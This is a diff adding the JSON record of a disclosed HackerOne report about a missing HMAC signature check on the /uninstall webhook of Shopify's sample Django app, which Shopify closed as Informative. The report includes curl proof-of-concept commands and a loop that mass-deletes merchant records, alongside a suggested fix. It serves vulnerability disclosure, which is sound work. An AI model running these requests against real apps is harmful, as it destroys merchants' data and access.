@@ -1,0 +1,138 @@
+{
+  "id": 3697491,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjk3NDkx",
+  "url": "https://hackerone.com/reports/3697491",
+  "title": "Missing HMAC validation on /uninstall webhook in Shopify/sample-django-app reference template",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "none",
+  "readable_substate": "Informative",
+  "created_at": "2026-04-26T22:35:26.112Z",
+  "submitted_at": "2026-04-26T22:35:27.077Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cipher-kid",
+    "url": "/cipher-kid",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-01T17:38:27.785Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-04-27T18:10:12.477Z",
+  "team_member_agreed_on_going_public_at": "2026-06-01T17:38:27.078Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Repository: https://github.com/Shopify/sample-django-app             \n\n## Description\n\nThe `/uninstall` webhook endpoint in `sample-django-app` processes incoming requests without verifying the `X-Shopify-Hmac-Sha256` header. Shopify explicitly requires this validation as a mandatory security measure for all webhook endpoints, as documented in the official Shopify developer documentation.\n\nAs a result, any unauthenticated attacker can send a crafted POST request to delete any merchant’s record from the database, effectively revoking their access token and force-uninstalling the application without their knowledge or consent.\n\nSince this repository is an **official Shopify reference template**, the vulnerability propagates to any third-party application built on top of it.\n\n-----\n\n## Vulnerability Location\n\n**File:** `sample_django_app/shopify_app/views.py` — lines 47–51\n\n```python\n@csrf_exempt\ndef uninstall(request):\n    uninstall_data = json.loads(request.body)\n    shop = uninstall_data.get(\"domain\")\n    Shop.objects.filter(shopify_domain=shop).delete()\n    return HttpResponse(status=204)\n```\n\n**Root cause:** The `@csrf_exempt` decorator is expected here since Shopify cannot send a CSRF token with webhook requests. However, this must be compensated by HMAC signature validation to ensure the request genuinely originates from Shopify. No such validation is present — neither the existence of the header nor its cryptographic integrity is checked before the deletion is executed.\n\n-----\n\n## Exploitation Requirements\n\n|Requirement                      |Needed?                                     |\n|---------------------------------|--------------------------------------------|\n|Shopify account                  | No                                        |\n|Authentication                   | No                                        |\n|Knowledge of a target shop domain| Yes                                       |\n|Special tooling                  | No — a single `curl` command is sufficient|\n\n-----\n\n## Proof of Concept\n\n### Step 1 — Send the unauthenticated request\n\n```bash\ncurl -X POST https://target-app.com/uninstall \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"domain\": \"target-shop-domain\"}'\n```\n\n### Step 2 — Observed response\n\n```\nHTTP/1.1 204 No Content\n```\n\nThe shop record matching `target-shop-domain` is deleted from the database. Its Shopify access token is permanently erased. The merchant loses access to the application instantly, with no warning and no action required from the attacker.\n\n### Step 3 — Mass deletion\n\nThe attack can be repeated for any known shop domain registered on the application, with no rate limiting or authentication preventing it:\n\n```bash\nfor domain in $(cat known_shops.txt); do\n  curl -s -o /dev/null -w \"%{http_code} $domain\\n\" \\\n    -X POST https://target-app.com/uninstall \\\n    -H \"Content-Type: application/json\" \\\n    -d \"{\\\"domain\\\": \\\"$domain\\\"}\"\ndone\n```\n\n-----\n\n## Impact\n\n- **For merchants:** Sudden and unexplained loss of access to the application. The merchant must reinstall the application and re-grant all permissions manually, with no indication of what happened.\n- **For developers using this template:** Any application built from `sample-django-app` inherits this vulnerability directly. An attacker with a list of registered shop domains can wipe all merchant records in seconds.\n- **For the Shopify ecosystem:** This repository is an official reference template linked in Shopify Partners documentation. A vulnerability here has a multiplied impact across all developers who base their apps on it.\n\n-----\n\n## Root Cause & Fix\n\nShopify’s official documentation mandates HMAC verification on all webhook endpoints:\n\n> *“Each webhook request includes a `X-Shopify-Hmac-Sha256` header […] which is generated using the app’s client secret along with the data sent in the request. To verify that the request came from Shopify, compute the HMAC digest and compare it to the value in the header.”*\n\n**Source:** https://shopify.dev/docs/apps/build/webhooks/best-practices/validate-webhooks\n\n### Suggested fix\n\n```python\nimport hmac\nimport hashlib\nimport base64\n\n@csrf_exempt\ndef uninstall(request):\n    # Step 1 — Ensure the HMAC header is present\n    hmac_header = request.META.get('HTTP_X_SHOPIFY_HMAC_SHA256', '')\n    if not hmac_header:\n        return HttpResponse(status=401)\n\n    # Step 2 — Compute the expected HMAC\n    secret = apps.get_app_config('shopify_app').SHOPIFY_API_SECRET.encode('utf-8')\n    digest = hmac.new(secret, request.body, hashlib.sha256).digest()\n    computed_hmac = base64.b64encode(digest).decode('utf-8')\n\n    # Step 3 — Constant-time comparison to prevent timing attacks\n    if not hmac.compare_digest(computed_hmac, hmac_header):\n        return HttpResponse(status=401)\n\n    # Step 4 — Safe to process\n    try:\n        uninstall_data = json.loads(request.body)\n    except json.JSONDecodeError:\n        return HttpResponse(status=400)\n\n    shop = uninstall_data.get(\"domain\")\n    if not shop:\n        return HttpResponse(status=400)\n\n    Shop.objects.filter(shopify_domain=shop).delete()\n    return HttpResponse(status=204)\n```\n\n-----\n\n## Additional Recommendations\n\n**Input validation on the domain field:**\n\n```python\nif not isinstance(shop, str) or len(shop) > 255:\n    return HttpResponse(status=400)\n```\n\n**JSON bomb protection** — no size limit is enforced on the request body:\n\n```python\nif len(request.body) > 10_000:\n    return HttpResponse(status=413)\n```",
+  "weakness": {
+    "id": 589,
+    "name": "Improper Verification of Cryptographic Signature"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 2,
+  "voters": [
+    "ahmed_xyz",
+    "pum482930"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 596023,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/Shopify/*",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 859565,
+      "category": "team",
+      "content": "The researcher reported that the `/uninstall` webhook endpoint in `Shopify/sample-django-app` doesn't validate the `X-Shopify-Hmac-Sha256` header before deleting shop records — a deviation from Shopify's documented webhook guidance (https://shopify.dev/docs/apps/build/webhooks/best-practices/validate-webhooks).\n\nClosed as Informative because `sample-django-app` is a reference template that doesn't run in any Shopify-operated environment and doesn't handle real merchant data. Developers building on top of it are responsible for the production-grade controls documented in the link above. Reports must demonstrate exploitable impact on live Shopify systems, merchants or buyers, not theoretical vulnerabilities in sample code.",
+      "updated_at": "2026-05-29T23:07:04.083Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 3412393,
+        "username": "seb_shopify",
+        "name": "Sebastien",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2024-10-02T14:40:12.193Z",
+        "url": "https://hackerone.com/seb_shopify",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
